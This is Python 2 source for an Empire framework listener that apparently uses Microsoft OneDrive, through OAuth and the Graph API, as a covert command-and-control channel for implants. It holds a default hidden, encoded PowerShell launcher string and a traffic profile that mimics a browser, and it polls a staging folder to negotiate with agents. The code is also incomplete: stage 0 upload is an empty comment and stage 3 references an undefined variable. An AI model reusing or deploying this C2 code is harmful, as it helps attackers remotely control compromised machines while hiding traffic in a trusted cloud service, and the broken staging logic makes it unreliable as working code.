import base64
import random
import os
import re
import time
import copy
import traceback
import sys
from pydispatch import dispatcher
from requests import Request, Session

#Empire imports
from lib.common import helpers
from lib.common import agents
from lib.common import encryption
from lib.common import packets
from lib.common import messages

class Listener:
    def __init__(self, mainMenu, params=[]):
        self.info = {
                'Name': 'Onedrive',
                'Author': ['@mr64bit'],
                'Description': ('Starts a Onedrive listener.'),
                'Category': ('third_party'),
                'Comments': []
                }

        self.options = {
            'Name' : {
                'Description'   :   'Name for the listener.',
                'Required'      :   True,
                'Value'         :   'onedrive'
            },
            'ClientID' : {
                'Description'   :   'Client ID of the OAuth App.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'AuthCode' : {
                'Description'   :   'Auth code given after authenticating OAuth App.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'BaseFolder' : {
                'Description'   :   'The base Onedrive folder to use for comms.',
                'Required'      :   True,
                'Value'         :   'empire'
            },
            'StagingFolder' : {
                'Description'   :   'The nested Onedrive staging folder.',
                'Required'      :   True,
                'Value'         :   'staging'
            },
            'TaskingsFolder' : {
                'Description'   :   'The nested Onedrive taskings folder.',
                'Required'      :   True,
                'Value'         :   'taskings'
            },
            'ResultsFolder' : {
                'Description'   :   'The nested Onedrive results folder.',
                'Required'      :   True,
                'Value'         :   'results'
            },
            'Launcher' : {
                'Description'   :   'Launcher string.',
                'Required'      :   True,
                'Value'         :   'powershell -noP -sta -w 1 -enc '
            },
            'StagingKey' : {
                'Description'   :   'Staging key for intial agent negotiation.',
                'Required'      :   True,
                'Value'         :   'asdf'
            },
            'PollInterval' : {
                'Description'   :   'Polling interval (in seconds) to communicate with Onedrive.',
                'Required'      :   True,
                'Value'         :   '5'
            },
            'DefaultDelay' : {
                'Description'   :   'Agent delay/reach back interval (in seconds).',
                'Required'      :   True,
                'Value'         :   60
            },
            'DefaultJitter' : {
                'Description'   :   'Jitter in agent reachback interval (0.0-1.0).',
                'Required'      :   True,
                'Value'         :   0.0
            },
            'DefaultLostLimit' : {
                'Description'   :   'Number of missed checkins before exiting',
                'Required'      :   True,
                'Value'         :   10
            },
            'DefaultProfile' : {
                'Description'   :   'Default communication profile for the agent.',
                'Required'      :   True,
                'Value'         :   "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
            },
            'KillDate' : {
                'Description'   :   'Date for the listener to exit (MM/dd/yyyy).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'WorkingHours' : {
                'Description'   :   'Hours for the agent to operate (09:00-17:00).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'RefreshToken' : {
                'Description'   :   'Refresh token used to refresh the auth token',
                'Required'      :   False,
                'Value'         :   ''
            },
            'RedirectURI' : {
                'Description'   :   'Redirect URI of the registered application',
                'Required'      :   True,
                'Value'         :   "https://login.live.com/oauth20_desktop.srf"
            }
        }

        self.mainMenu = mainMenu
        self.threads = {}

        self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])

    def default_response(self):
        return ''

    def validate_options(self):

        self.uris = [a.strip('/') for a in self.options['DefaultProfile']['Value'].split('|')[0].split(',')]

        if (str(self.options['RefreshToken']['Value']).strip() == '') and (str(self.options['AuthCode']['Value']).strip() == ''):
            if (str(self.options['ClientID']['Value']).strip() == ''):
                print helpers.color("[!] ClientID needed to generate AuthCode URL!")
                return False
            params = {'client_id': str(self.options['ClientID']['Value']).strip(),
                      'response_type': 'code',
                      'redirect_uri': self.options['RedirectURI']['Value'],
                      'scope': 'files.readwrite offline_access'}
            req = Request('GET','https://login.microsoftonline.com/common/oauth2/v2.0/authorize', params = params)
            prep = req.prepare()
            print helpers.color("[*] Get your AuthCode from \"%s\" and try starting the listener again." % prep.url)
            return False

        for key in self.options:
            if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
                print helpers.color("[!] Option \"%s\" is required." % (key))
                return False

        return True

    def start_server(self, listenerOptions):

        def get_token(client_id, code):
            params = {'client_id': client_id,
                      'grant_type': 'authorization_code',
                      'scope': 'files.readwrite offline_access',
                      'code': code,
                      'redirect_uri': redirectURI}
            try:
                r = s.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', data=params)
                s.headers['Authorization'] = "Bearer " + r.json()['access_token']
                # self.mainMenu.listeners.update_listener_options(listenerName, "RefreshToken", r.json()['refresh_token'])
                print "in 'get_token'"
                rToken = r.json()
                rToken['expires_at'] = time.time() + (int)(rToken['expires_in']) - 15
                rToken['update'] = True
                dispatcher.send("[*] Got new auth token", sender="listeners/onedrive")
                return rToken
            except KeyError, e:
                print helpers.color("[!] Something went wrong, HTTP response %d, error code %s: %s" % (r.status_code, r.json()['error_codes'], r.json()['error_description']))
                raise

        def refresh_token(client_id, refreshtoken):
            params = {'client_id': client_id,
                      'grant_type': 'refresh_token',
                      'scope': 'files.readwrite offline_access',
                      'refresh_token': refreshtoken,
                      'redirect_uri': redirectURI}
            try:
                r = s.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', data=params)
                s.headers['Authorization'] = "Bearer " + r.json()['access_token']
                rToken = r.json()
                rToken['expires_at'] = time.time() + (int)(rToken['expires_in']) - 15
                rToken['update'] = True
                dispatcher.send("[*] Refreshed auth token", sender="listeners/onedrive")
                return rToken
            except KeyError, e:
                print helpers.color("[!] Something went wrong, HTTP response %d, error code %s: %s" % (r.status_code, r.json()['error_codes'], r.json()['error_description']))
                raise

        def test_token(token):
            headers = s.headers.copy()
            headers['Authorization'] = 'Bearer ' + token

            request = s.get("%s/drive" % baseURL, headers=headers)

            return request.ok

        def setup_folders():
            if not (test_token(token['access_token'])):
                raise ValueError("Could not set up folders, access token invalid")

            baseObject = s.get("%s/drive/root:/%s" % (baseURL, baseFolder))
            if not (baseObject.status_code == 200):
                print helpers.color("[*] Creating %s folder" % baseFolder)
                params = {'@microsoft.graph.conflictBehavior': 'rename', 'folder': {}, 'name': baseFolder}
                baseObject = s.post("%s/drive/items/root/children" % baseURL, json=params)
            else:
                print helpers.color("[*] %s folder already exists" % baseFolder)

            for item in [stagingFolder, taskingsFolder, resultsFolder]:
                itemObject = s.get("%s/drive/root:/%s/%s" % (baseURL, baseFolder, item))
                if not (itemObject.status_code == 200):
                    print helpers.color("[*] Creating %s/%s folder" % (baseFolder, item))
                    params = {'@microsoft.graph.conflictBehavior': 'rename', 'folder': {}, 'name': item}
                    itemObject = s.post("%s/drive/items/%s/children" % (baseURL, baseObject.json()['id']), json=params)
                else:
                    print helpers.color("[*] %s/%s already exists" % (baseFolder, item))

        listenerOptions = copy.deepcopy(listenerOptions)

        listenerName = listenerOptions['Name']['Value']
        stagingKey = listenerOptions['StagingKey']['Value']
        pollInterval = listenerOptions['PollInterval']['Value']
        clientID = listenerOptions['ClientID']['Value']
        authCode = listenerOptions['AuthCode']['Value']
        refreshToken = listenerOptions['RefreshToken']['Value']
        baseFolder = listenerOptions['BaseFolder']['Value']
        stagingFolder = listenerOptions['StagingFolder']['Value'].strip('/')
        taskingsFolder = listenerOptions['TaskingsFolder']['Value'].strip('/')
        resultsFolder = listenerOptions['ResultsFolder']['Value'].strip('/')
        redirectURI = listenerOptions['RedirectURI']['Value']
        baseURL = "https://graph.microsoft.com/v1.0"

        s = Session()

        if refreshToken:
            token = refresh_token(clientID, refreshToken)
        else:
            token = get_token(clientID, authCode)

        setup_folders()

        # Upload stage 0

        while True:
            time.sleep(int(pollInterval))
            try:
                if time.time() > token['expires_at']:
                    refresh_token(clientID, token['refresh_token'])
                if token['update']:
                    self.mainMenu.listeners.update_listener_options(listenerName, "RefreshToken", token['refresh_token'])
                    token['update'] = False

                search = s.get("%s/drive/items/root:/%s/%s:/search(q='{*_*.txt}')" % (baseURL, baseFolder, stagingFolder))
                for item in search.json()['value']:
                    print(item)
                    try:
                        agent_name, stage = re.search("^([A-Z]+)_([0-9]).txt", item['name']).groups()
                        dispatcher.send("[*] Downloading %s/%s, %d bytes" % (stagingFolder,  item['name'], item['size']), sender="listeners/onedrive")
                        content = s.get(item['@microsoft.graph.downloadUrl']).content

                        if stage == '1':
                            print "Stage 1"
                            lang, return_val = self.mainMenu.agents.handle_agent_data(stagingKey, content, listenerOptions)
                            dispatcher.send("[*] Uploading %s/%s_2.txt, %d bytes" % (baseFolder, agent_name, len(return_val)))
                            s.put("%s/drive/items/%s/:%s_2.txt:/content" % (baseURL, item['id'], agent_name), data=return_val)
                            dispatcher.send("[*] Deleting %s/%s" % (stagingFolder, item['name']))
                            s.delete("%s/drive/items/%s" % (baseURL, item['id']))

                        if stage == '3':
                            print "Stage 3"
                            lang, return_val = self.mainMenu.agents.handle_agent_data(stagingKey, stageData, listenerOptions)


                    except Exception, e:
                        print(traceback.format_exc())


            except Exception, e:
                print(e)


    def start(self, name=''):
        """
        Start a threaded instance of self.start_server() and store it in the
        self.threads dictionary keyed by the listener name.

        """
        listenerOptions = self.options
        if name and name != '':
            self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
            self.threads[name].start()
            time.sleep(3)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()
        else:
            name = listenerOptions['Name']['Value']
            self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
            self.threads[name].start()
            time.sleep(3)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()


    def shutdown(self, name=''):
        """
        Terminates the server thread stored in the self.threads dictionary,
        keyed by the listener name.
        """

        if name and name != '':
            print helpers.color("[!] Killing listener '%s'" % (name))
            self.threads[name].kill()
        else:
            print helpers.color("[!] Killing listener '%s'" % (self.options['Name']['Value']))
            self.threads[self.options['Name']['Value']].kill()

